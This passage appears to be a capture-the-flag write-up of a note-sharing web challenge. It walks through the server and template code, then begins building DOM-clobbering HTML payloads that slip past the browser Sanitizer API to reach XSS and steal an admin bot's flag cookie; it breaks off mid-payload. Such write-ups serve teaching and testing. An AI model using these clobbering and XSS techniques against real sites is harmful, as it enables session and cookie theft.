</span></span><span style=display:flex><span><span style=color:#c678dd>const</span> <span style=color:#c1abea>__dirname</span> <span style=color:#c7bf54>=</span> <span style=color:#c1abea>path</span>.<span style=color:#c1abea>resolve</span>(<span style=color:#c1abea>path</span>.<span style=color:#c1abea>dirname</span>(<span style=color:#63c381>&#34;&#34;</span>));
</span></span><span style=display:flex><span><span style=color:#c678dd>const</span> <span style=color:#c1abea>app</span> <span style=color:#c7bf54>=</span> <span style=color:#c1abea>express</span>();
</span></span><span style=display:flex><span><span style=color:#c678dd>const</span> <span style=color:#c1abea>port</span> <span style=color:#c7bf54>=</span> <span style=color:#d19a66>3000</span>;
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#c1abea>app</span>.<span style=color:#c1abea>set</span>(<span style=color:#63c381>&#34;view engine&#34;</span>, <span style=color:#63c381>&#34;ejs&#34;</span>);
</span></span><span style=display:flex><span><span style=color:#c1abea>app</span>.<span style=color:#c1abea>use</span>(<span style=color:#c1abea>bodyParser</span>.<span style=color:#c1abea>json</span>());
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#c678dd>const</span> <span style=color:#c1abea>browser</span> <span style=color:#c7bf54>=</span> <span style=color:#c1abea>puppeteer</span>.<span style=color:#c1abea>launch</span>({
</span></span><span style=display:flex><span>  <span style=color:#c1abea>pipe</span><span style=color:#c7bf54>:</span> <span style=color:#b756ff;font-weight:700>true</span>,
</span></span><span style=display:flex><span>  <span style=color:#c1abea>args</span><span style=color:#c7bf54>:</span> [<span style=color:#63c381>&#34;--no-sandbox&#34;</span>, <span style=color:#63c381>&#34;--disable-dev-shm-usage&#34;</span>],
</span></span><span style=display:flex><span>});
</span></span><span style=display:flex><span><span style=color:#c678dd>const</span> <span style=color:#c1abea>sanes</span> <span style=color:#c7bf54>=</span> <span style=color:#c678dd>new</span> <span style=color:#c1abea>Map</span>();
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#c1abea>app</span>.<span style=color:#c1abea>get</span>(<span style=color:#63c381>&#34;/&#34;</span>, (<span style=color:#c1abea>req</span>, <span style=color:#c1abea>res</span>) =&gt; {
</span></span><span style=display:flex><span>  <span style=color:#c1abea>res</span>.<span style=color:#c1abea>sendFile</span>(<span style=color:#c1abea>path</span>.<span style=color:#c1abea>join</span>(<span style=color:#c1abea>__dirname</span>, <span style=color:#98c379>`/index.html`</span>));
</span></span><span style=display:flex><span>});
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#c1abea>app</span>.<span style=color:#c1abea>post</span>(<span style=color:#63c381>&#34;/submit&#34;</span>, (<span style=color:#c1abea>req</span>, <span style=color:#c1abea>res</span>) =&gt; {
</span></span><span style=display:flex><span>  <span style=color:#c678dd>const</span> <span style=color:#c1abea>id</span> <span style=color:#c7bf54>=</span> <span style=color:#c1abea>nanoid</span>();
</span></span><span style=display:flex><span>  <span style=color:#c678dd>if</span> (<span style=color:#c7bf54>!</span><span style=color:#c1abea>req</span>.<span style=color:#c1abea>body</span>.<span style=color:#c1abea>title</span>) <span style=color:#c678dd>return</span> <span style=color:#c1abea>res</span>.<span style=color:#c1abea>status</span>(<span style=color:#d19a66>400</span>).<span style=color:#c1abea>send</span>(<span style=color:#63c381>&#34;no title&#34;</span>);
</span></span><span style=display:flex><span>  <span style=color:#c678dd>if</span> (<span style=color:#c1abea>req</span>.<span style=color:#c1abea>body</span>.<span style=color:#c1abea>title</span>.<span style=color:#c1abea>length</span> <span style=color:#c7bf54>&gt;</span> <span style=color:#d19a66>100</span>)
</span></span><span style=display:flex><span>    <span style=color:#c678dd>return</span> <span style=color:#c1abea>res</span>.<span style=color:#c1abea>status</span>(<span style=color:#d19a66>400</span>).<span style=color:#c1abea>send</span>(<span style=color:#63c381>&#34;title too long&#34;</span>);
</span></span><span style=display:flex><span>  <span style=color:#c678dd>if</span> (<span style=color:#c7bf54>!</span><span style=color:#c1abea>req</span>.<span style=color:#c1abea>body</span>.<span style=color:#c1abea>body</span>) <span style=color:#c678dd>return</span> <span style=color:#c1abea>res</span>.<span style=color:#c1abea>status</span>(<span style=color:#d19a66>400</span>).<span style=color:#c1abea>send</span>(<span style=color:#63c381>&#34;no body&#34;</span>);
</span></span><span style=display:flex><span>  <span style=color:#c678dd>if</span> (<span style=color:#c1abea>req</span>.<span style=color:#c1abea>body</span>.<span style=color:#c1abea>body</span>.<span style=color:#c1abea>length</span> <span style=color:#c7bf54>&gt;</span> <span style=color:#d19a66>2000</span>) <span style=color:#c678dd>return</span> <span style=color:#c1abea>res</span>.<span style=color:#c1abea>status</span>(<span style=color:#d19a66>400</span>).<span style=color:#c1abea>send</span>(<span style=color:#63c381>&#34;body too long&#34;</span>);
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>  <span style=color:#c1abea>sanes</span>.<span style=color:#c1abea>set</span>(<span style=color:#c1abea>id</span>, <span style=color:#c1abea>req</span>.<span style=color:#c1abea>body</span>);
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>  <span style=color:#c1abea>res</span>.<span style=color:#c1abea>send</span>(<span style=color:#c1abea>id</span>);
</span></span><span style=display:flex><span>});
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#c1abea>app</span>.<span style=color:#c1abea>get</span>(<span style=color:#63c381>&#34;/:sane&#34;</span>, (<span style=color:#c1abea>req</span>, <span style=color:#c1abea>res</span>) =&gt; {
</span></span><span style=display:flex><span>  <span style=color:#c678dd>const</span> <span style=color:#c1abea>sane</span> <span style=color:#c7bf54>=</span> <span style=color:#c1abea>sanes</span>.<span style=color:#c1abea>get</span>(<span style=color:#c1abea>req</span>.<span style=color:#c1abea>params</span>.<span style=color:#c1abea>sane</span>);
</span></span><span style=display:flex><span>  <span style=color:#c678dd>if</span> (<span style=color:#c7bf54>!</span><span style=color:#c1abea>sane</span>) <span style=color:#c678dd>return</span> <span style=color:#c1abea>res</span>.<span style=color:#c1abea>status</span>(<span style=color:#d19a66>404</span>).<span style=color:#c1abea>send</span>(<span style=color:#63c381>&#34;not found&#34;</span>);
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>  <span style=color:#c1abea>res</span>.<span style=color:#c1abea>render</span>(<span style=color:#63c381>&#34;sanes&#34;</span>, {
</span></span><span style=display:flex><span>    <span style=color:#c1abea>id</span><span style=color:#c7bf54>:</span> <span style=color:#c1abea>req</span>.<span style=color:#c1abea>params</span>.<span style=color:#c1abea>sane</span>,
</span></span><span style=display:flex><span>    <span style=color:#c1abea>title</span><span style=color:#c7bf54>:</span> <span style=color:#ef8383>encodeURIComponent</span>(<span style=color:#c1abea>sane</span>.<span style=color:#c1abea>title</span>),
</span></span><span style=display:flex><span>    <span style=color:#c1abea>body</span><span style=color:#c7bf54>:</span> <span style=color:#ef8383>encodeURIComponent</span>(<span style=color:#c1abea>sane</span>.<span style=color:#c1abea>body</span>),
</span></span><span style=display:flex><span>  });
</span></span><span style=display:flex><span>});
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#c1abea>app</span>.<span style=color:#c1abea>get</span>(<span style=color:#63c381>&#34;/report/:sane&#34;</span>, <span style=color:#c678dd>async</span> (<span style=color:#c1abea>req</span>, <span style=color:#c1abea>res</span>) =&gt; {
</span></span><span style=display:flex><span>  <span style=color:#c678dd>let</span> <span style=color:#c1abea>ctx</span>;
</span></span><span style=display:flex><span>  <span style=color:#c678dd>try</span> {
</span></span><span style=display:flex><span>    <span style=color:#c1abea>ctx</span> <span style=color:#c7bf54>=</span> <span style=color:#c678dd>await</span> (<span style=color:#c678dd>await</span> <span style=color:#c1abea>browser</span>).<span style=color:#c1abea>createIncognitoBrowserContext</span>();
</span></span><span style=display:flex><span>    <span style=color:#c678dd>const</span> <span style=color:#c1abea>visit</span> <span style=color:#c7bf54>=</span> <span style=color:#c678dd>async</span> (<span style=color:#c1abea>browser</span>, <span style=color:#c1abea>sane</span>) =&gt; {
</span></span><span style=display:flex><span>      <span style=color:#c678dd>const</span> <span style=color:#c1abea>page</span> <span style=color:#c7bf54>=</span> <span style=color:#c678dd>await</span> <span style=color:#c1abea>browser</span>.<span style=color:#c1abea>newPage</span>();
</span></span><span style=display:flex><span>      <span style=color:#c678dd>await</span> <span style=color:#c1abea>page</span>.<span style=color:#c678dd>goto</span>(<span style=color:#63c381>&#34;http://localhost:3000&#34;</span>);
</span></span><span style=display:flex><span>      <span style=color:#c678dd>await</span> <span style=color:#c1abea>page</span>.<span style=color:#c1abea>setCookie</span>({ <span style=color:#c1abea>name</span><span style=color:#c7bf54>:</span> <span style=color:#63c381>&#34;flag&#34;</span>, <span style=color:#c1abea>value</span><span style=color:#c7bf54>:</span> <span style=color:#c1abea>process</span>.<span style=color:#c1abea>env</span>.<span style=color:#c1abea>FLAG</span> });
</span></span><span style=display:flex><span>      <span style=color:#c678dd>await</span> <span style=color:#c1abea>page</span>.<span style=color:#c678dd>goto</span>(<span style=color:#98c379>`http://localhost:3000/</span><span style=color:#98c379>${</span><span style=color:#c1abea>sane</span><span style=color:#98c379>}</span><span style=color:#98c379>`</span>);
</span></span><span style=display:flex><span>      <span style=color:#c678dd>await</span> <span style=color:#c1abea>page</span>.<span style=color:#c1abea>waitForNetworkIdle</span>({ <span style=color:#c1abea>timeout</span><span style=color:#c7bf54>:</span> <span style=color:#d19a66>5000</span> });
</span></span><span style=display:flex><span>      <span style=color:#c678dd>await</span> <span style=color:#c1abea>page</span>.<span style=color:#c1abea>close</span>();
</span></span><span style=display:flex><span>    };
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>    <span style=color:#c678dd>await</span> <span style=color:#ef8383>Promise</span>.<span style=color:#c1abea>race</span>([<span style=color:#c1abea>visit</span>(<span style=color:#c1abea>ctx</span>, <span style=color:#c1abea>req</span>.<span style=color:#c1abea>params</span>.<span style=color:#c1abea>sane</span>), <span style=color:#c1abea>sleep</span>(<span style=color:#d19a66>10_000</span>)]);
</span></span><span style=display:flex><span>  } <span style=color:#c678dd>catch</span> (<span style=color:#c1abea>err</span>) {
</span></span><span style=display:flex><span>    <span style=color:#c1abea>console</span>.<span style=color:#c1abea>error</span>(<span style=color:#63c381>&#34;Handler error&#34;</span>, <span style=color:#c1abea>err</span>);
</span></span><span style=display:flex><span>    <span style=color:#c678dd>if</span> (<span style=color:#c1abea>ctx</span>) {
</span></span><span style=display:flex><span>      <span style=color:#c678dd>try</span> {
</span></span><span style=display:flex><span>        <span style=color:#c678dd>await</span> <span style=color:#c1abea>ctx</span>.<span style=color:#c1abea>close</span>();
</span></span><span style=display:flex><span>      } <span style=color:#c678dd>catch</span> (<span style=color:#c1abea>e</span>) {}
</span></span><span style=display:flex><span>    }
</span></span><span style=display:flex><span>    <span style=color:#c678dd>return</span> <span style=color:#c1abea>res</span>.<span style=color:#c1abea>send</span>(<span style=color:#63c381>&#34;Error visiting page&#34;</span>);
</span></span><span style=display:flex><span>  }
</span></span><span style=display:flex><span>  <span style=color:#c678dd>if</span> (<span style=color:#c1abea>ctx</span>) {
</span></span><span style=display:flex><span>    <span style=color:#c678dd>try</span> {
</span></span><span style=display:flex><span>      <span style=color:#c678dd>await</span> <span style=color:#c1abea>ctx</span>.<span style=color:#c1abea>close</span>();
</span></span><span style=display:flex><span>    } <span style=color:#c678dd>catch</span> (<span style=color:#c1abea>e</span>) {}
</span></span><span style=display:flex><span>  }
</span></span><span style=display:flex><span>  <span style=color:#c678dd>return</span> <span style=color:#c1abea>res</span>.<span style=color:#c1abea>send</span>(<span style=color:#63c381>&#34;Successfully reported!&#34;</span>);
</span></span><span style=display:flex><span>});
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#c1abea>app</span>.<span style=color:#c1abea>listen</span>(<span style=color:#c1abea>port</span>, () =&gt; {
</span></span><span style=display:flex><span>  <span style=color:#c1abea>console</span>.<span style=color:#c1abea>log</span>(<span style=color:#98c379>`Example app listening on port </span><span style=color:#98c379>${</span><span style=color:#c1abea>port</span><span style=color:#98c379>}</span><span style=color:#98c379>`</span>);
</span></span><span style=display:flex><span>});
</span></span></code></pre></td></tr></table></div></div><p><code>index.js</code> has nothing too interesting, just a typical note XSS setup where we can submit a title and body, then report the note for the admin bot to see and get XSS&rsquo;d. Flag is stored inside of admin&rsquo;s cookies, so we just need to extract those.</p><p>However, looking at <code>sanes.ejs</code>, there is a few parts of interest:</p><p>First, we have this <code>sanitizer</code> object, which is used to set the HTML of the title.</p><div class=highlight><div style=color:#b0c4de;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4><table style=border-spacing:0;padding:0;margin:0;border:0><tr><td style=vertical-align:top;padding:0;margin:0;border:0><pre tabindex=0 style=color:#b0c4de;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#58626f">1
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#58626f">2
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#58626f">3
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#58626f">4
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#58626f">5
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#58626f">6
</span></code></pre></td><td style=vertical-align:top;padding:0;margin:0;border:0;width:100%><pre tabindex=0 style=color:#b0c4de;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-html data-lang=html><span style=display:flex><span>&lt;<span style=color:#e06c75>h1</span> <span style=color:#b3d23c>id</span><span style=color:#c7bf54>=</span><span style=color:#98c379>&#34;title&#34;</span>&gt;
</span></span><span style=display:flex><span>    &lt;<span style=color:#e06c75>script</span>&gt;
</span></span><span style=display:flex><span>        <span style=color:#c678dd>const</span> <span style=color:#c1abea>sanitizer</span> <span style=color:#c7bf54>=</span> <span style=color:#c678dd>new</span> <span style=color:#c1abea>Sanitizer</span>();
</span></span><span style=display:flex><span>        <span style=color:#ef8383>document</span>.<span style=color:#c1abea>getElementById</span>(<span style=color:#63c381>&#34;title&#34;</span>).<span style=color:#c1abea>setHTML</span>(<span style=color:#ef8383>decodeURIComponent</span>(<span style=color:#98c379>`&lt;%- title %&gt;`</span>), { <span style=color:#c1abea>sanitizer</span> });
</span></span><span style=display:flex><span>    &lt;/<span style=color:#e06c75>script</span>&gt;
</span></span><span style=display:flex><span>&lt;/<span style=color:#e06c75>h1</span>&gt;
</span></span></code></pre></td></tr></table></div></div><p>Then, we have this <code>loadBody</code> function which seems vulnerable to XSS if we can fulfill some conditions:</p><div class=highlight><div style=color:#b0c4de;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4><table style=border-spacing:0;padding:0;margin:0;border:0><tr><td style=vertical-align:top;padding:0;margin:0;border:0><pre tabindex=0 style=color:#b0c4de;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#58626f"> 1
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#58626f"> 2
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#58626f"> 3
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#58626f"> 4
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#58626f"> 5
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#58626f"> 6
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#58626f"> 7
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#58626f"> 8
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#58626f"> 9
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#58626f">10
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#58626f">11
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#58626f">12
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#58626f">13
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#58626f">14
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#58626f">15
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#58626f">16
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#58626f">17
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#58626f">18
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#58626f">19
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#58626f">20
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#58626f">21
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#58626f">22
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#58626f">23
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#58626f">24
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#58626f">25
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#58626f">26
</span></code></pre></td><td style=vertical-align:top;padding:0;margin:0;border:0;width:100%><pre tabindex=0 style=color:#b0c4de;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-js data-lang=js><span style=display:flex><span><span style=color:#c678dd>async</span> <span style=color:#c678dd>function</span> <span style=color:#c1abea>loadBody</span>() {
</span></span><span style=display:flex><span>    <span style=color:#c678dd>let</span> <span style=color:#c1abea>extension</span> <span style=color:#c7bf54>=</span> <span style=color:#b756ff;font-weight:700>null</span>;
</span></span><span style=display:flex><span>    <span style=color:#c678dd>if</span> (<span style=color:#ef8383>window</span>.<span style=color:#c1abea>debug</span><span style=color:#c7bf54>?</span>.<span style=color:#c1abea>extension</span>) {
</span></span><span style=display:flex><span>        <span style=color:#c678dd>let</span> <span style=color:#c1abea>res</span> <span style=color:#c7bf54>=</span> <span style=color:#c678dd>await</span> <span style=color:#c1abea>fetch</span>(<span style=color:#ef8383>window</span>.<span style=color:#c1abea>debug</span><span style=color:#c7bf54>?</span>.<span style=color:#c1abea>extension</span>.<span style=color:#c1abea>toString</span>());
</span></span><span style=display:flex><span>        <span style=color:#c1abea>extension</span> <span style=color:#c7bf54>=</span> <span style=color:#c678dd>await</span> <span style=color:#c1abea>res</span>.<span style=color:#c1abea>json</span>();
</span></span><span style=display:flex><span>    }
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>    <span style=color:#c678dd>const</span> <span style=color:#c1abea>debug</span> <span style=color:#c7bf54>=</span> <span style=color:#ef8383>Object</span>.<span style=color:#c1abea>assign</span>(<span style=color:#c678dd>new</span> <span style=color:#c1abea>Debug</span>(<span style=color:#b756ff;font-weight:700>true</span>), <span style=color:#c1abea>extension</span> <span style=color:#c7bf54>??</span> { <span style=color:#c1abea>report</span><span style=color:#c7bf54>:</span> <span style=color:#b756ff;font-weight:700>true</span> });
</span></span><span style=display:flex><span>    <span style=color:#c678dd>let</span> <span style=color:#c1abea>body</span> <span style=color:#c7bf54>=</span> <span style=color:#ef8383>decodeURIComponent</span>(<span style=color:#98c379>`&lt;%- body %&gt;`</span>);
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>    <span style=color:#c678dd>if</span> (<span style=color:#c1abea>debug</span>.<span style=color:#c1abea>report</span>) {
</span></span><span style=display:flex><span>        <span style=color:#c678dd>const</span> <span style=color:#c1abea>reportLink</span> <span style=color:#c7bf54>=</span> <span style=color:#ef8383>document</span>.<span style=color:#c1abea>createElement</span>(<span style=color:#63c381>&#34;a&#34;</span>);
</span></span><span style=display:flex><span>        <span style=color:#c1abea>reportLink</span>.<span style=color:#c1abea>innerHTML</span> <span style=color:#c7bf54>=</span> <span style=color:#98c379>`Report &lt;%= id %&gt;`</span>;
</span></span><span style=display:flex><span>        <span style=color:#c1abea>reportLink</span>.<span style=color:#c1abea>href</span> <span style=color:#c7bf54>=</span> <span style=color:#98c379>`report/&lt;%= id %&gt;`</span>;
</span></span><span style=display:flex><span>        <span style=color:#c1abea>reportLink</span>.<span style=color:#c1abea>style</span>.<span style=color:#c1abea>marginTop</span> <span style=color:#c7bf54>=</span> <span style=color:#63c381>&#34;1rem&#34;</span>;
</span></span><span style=display:flex><span>        <span style=color:#c1abea>reportLink</span>.<span style=color:#c1abea>style</span>.<span style=color:#c1abea>display</span> <span style=color:#c7bf54>=</span> <span style=color:#63c381>&#34;block&#34;</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>        <span style=color:#ef8383>document</span>.<span style=color:#c1abea>body</span>.<span style=color:#c1abea>appendChild</span>(<span style=color:#c1abea>reportLink</span>)
</span></span><span style=display:flex><span>    }
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>    <span style=color:#c678dd>if</span> (<span style=color:#c1abea>debug</span>.<span style=color:#c1abea>sanitize</span>) {
</span></span><span style=display:flex><span>        <span style=color:#ef8383>document</span>.<span style=color:#c1abea>getElementById</span>(<span style=color:#63c381>&#34;paste&#34;</span>).<span style=color:#c1abea>setHTML</span>(<span style=color:#c1abea>body</span>, { <span style=color:#c1abea>sanitizer</span> })
</span></span><span style=display:flex><span>    } <span style=color:#c678dd>else</span> {
</span></span><span style=display:flex><span>        <span style=color:#ef8383>document</span>.<span style=color:#c1abea>getElementById</span>(<span style=color:#63c381>&#34;paste&#34;</span>).<span style=color:#c1abea>innerHTML</span> <span style=color:#c7bf54>=</span> <span style=color:#c1abea>body</span>
</span></span><span style=display:flex><span>    }
</span></span><span style=display:flex><span>}
</span></span></code></pre></td></tr></table></div></div><p>If we can somehow get <code>debug.sanitize</code> to be false, then we can get XSS in the body easily. To do so, we would have to set <code>window.debug.extension</code> to an external URL that we control, which will then allow us to set <code>debug.sanitize</code> since <code>extension</code> will be loaded by data we control.</p><p>There&rsquo;s also the <code>debug.report</code> section, but that&rsquo;s just a handy link to allow us to easily report the note to the admin bot, and does nothing in terms of the actual exploit.</p><p>Setting <code>window.debug.extension</code> seems to be keying in to DOM Clobbering, but we only set the title before this, so we somehow need to DOM Clobber with just the title.</p><h3 id=sanitizer-api>Sanitizer API</h3><p>Going back to the title, we see that it uses a special <code>Sanitizer</code> object. Doing some searching, we can find that this is actually the new <a href=https://developer.mozilla.org/en-US/docs/Web/API/HTML_Sanitizer_API>Sanitizer API</a>. Unfortunately it&rsquo;s only on newer versions of Chrome/Edge, so you may need to update your browser to test locally (but the bot is running on a version that supports it, so we&rsquo;re good).</p><p>Anyway, this API is intended to sanitize HTML strings to prevent attacks like XSS. However, with a bit more research, we can find the <a href=https://wicg.github.io/sanitizer-api/#dom-clobbering>original group report for the Sanitizer API where it explicity says</a>:</p><p><img src=/img/writeups/2023/upsolving/web-workshop-1/dom-clob.png alt="Section 4.2 on Sanitizer API report"></p><blockquote><p>The Sanitizer API does not protect DOM clobbering attacks in its default state, but can be configured to remove <code>id</code> and <code>name</code> attributes.</p></blockquote><p>Exactly what we&rsquo;re looking for! Let&rsquo;s try and craft a payload to test this.</p><h3 id=dom-clobbering-payload>DOM Clobbering Payload</h3><p>Well, first, we know we need to override <code>window.debug</code>, which is easy enough:</p><div class=highlight><div style=color:#b0c4de;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4><table style=border-spacing:0;padding:0;margin:0;border:0><tr><td style=vertical-align:top;padding:0;margin:0;border:0><pre tabindex=0 style=color:#b0c4de;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#58626f">1
</span></code></pre></td><td style=vertical-align:top;padding:0;margin:0;border:0;width:100%><pre tabindex=0 style=color:#b0c4de;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-html data-lang=html><span style=display:flex><span>&lt;<span style=color:#e06c75>h1</span> <span style=color:#b3d23c>id</span><span style=color:#c7bf54>=</span><span style=color:#98c379>&#34;debug&#34;</span>&gt;hi&lt;/<span style=color:#e06c75>h1</span>&gt;
</span></span></code></pre></td></tr></table></div></div><p>However, we actually need to be setting <code>window.debug.extension</code>. We can&rsquo;t do this with an extension attribute:</p><div class=highlight><div style=color:#b0c4de;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4><table style=border-spacing:0;padding:0;margin:0;border:0><tr><td style=vertical-align:top;padding:0;margin:0;border:0><pre tabindex=0 style=color:#b0c4de;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#58626f">1
</span></code></pre></td><td style=vertical-align:top;padding:0;margin:0;border:0;width:100%><pre tabindex=0 style=color:#b0c4de;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-html data-lang=html><span style=display:flex><span>&lt;<span style=color:#e06c75>h1</span> <span style=color:#b3d23c>id</span><span style=color:#c7bf54>=</span><span style=color:#98c379>&#34;debug&#34;</span> <span style=color:#b3d23c>extension</span><span style=color:#c7bf54>=</span><span style=color:#98c379>&#34;hi&#34;</span>&gt;hi&lt;/<span style=color:#e06c75>h1</span>&gt;
</span></span></code></pre></td></tr></table></div></div><p>Since the sanitizer will remove it, leaving just the <code>id</code>.</p><p>So instead, we can use the trick of having two elements with the same <code>id</code>. This is discouraged since two elements with the same <code>id</code> causes undefined behavior, but both the browser and the sanitizer allow it anyway.</p><div class=highlight><div style=color:#b0c4de;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4><table style=border-spacing:0;padding:0;margin:0;border:0><tr><td style=vertical-align:top;padding:0;margin:0;border:0><pre tabindex=0 style=color:#b0c4de;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#58626f">1
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#58626f">2
</span></code></pre></td><td style=vertical-align:top;padding:0;margin:0;border:0;width:100%><pre tabindex=0 style=color:#b0c4de;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-html data-lang=html><span style=display:flex><span>&lt;<span style=color:#e06c75>h1</span> <span style=color:#b3d23c>id</span><span style=color:#c7bf54>=</span><span style=color:#98c379>&#34;debug&#34;</span>&gt;xx&lt;/<span style=color:#e06c75>h1</span>&gt;
</span></span><span style=display:flex><span>&lt;<span style=color:#e06c75>h2</span> <span style=color:#b3d23c>id</span><span style=color:#c7bf54>=</span><span style=color:#98c379>&#34;debug&#34;</span>&gt;yy&lt;/<span style=color:#e06c75>h2</span>&gt;
</span></span></code></pre></td></tr></table></div></div><p>As a result, this is what we get:</p><div class=highlight><div style=color:#b0c4de;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4><table style=border-spacing:0;padding:0;margin:0;border:0><tr><td style=vertical-align:top;padding:0;margin:0;border:0><pre tabindex=0 style=color:#b0c4de;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#58626f">1
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#58626f">2
</span></code></pre></td><td style=vertical-align:top;padding:0;margin:0;border:0;width:100%><pre tabindex=0 style=color:#b0c4de;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-js data-lang=js><span style=display:flex><span><span style=color:#c7bf54>&gt;</span> <span style=color:#ef8383>window</span>.<span style=color:#c1abea>debug</span>
</span></span><span style=display:flex><span><span style=color:#c1abea>HTMLCollection</span>(<span style=color:#d19a66>2</span>) [<span style=color:#c1abea>h1</span>#<span style=color:#c1abea>debug</span>, <span style=color:#c1abea>h2</span>#<span style=color:#c1abea>debug</span>, <span style=color:#c1abea>debug</span><span style=color:#c7bf54>:</span> <span style=color:#c1abea>h1</span>#<span style=color:#c1abea>debug</span>]
</span></span></code></pre></td></tr></table></div></div><p>Now, if we add in the <code>name</code> attribute, we can use <code>extension</code> as a key:</p><div class=highlight><div style=color:#b0c4de;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4><table style=border-spacing:0;padding:0;margin:0;border:0><tr><td style=vertical-align:top;padding:0;margin:0;border:0><pre tabindex=0 style=color:#b0c4de;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#58626f">1
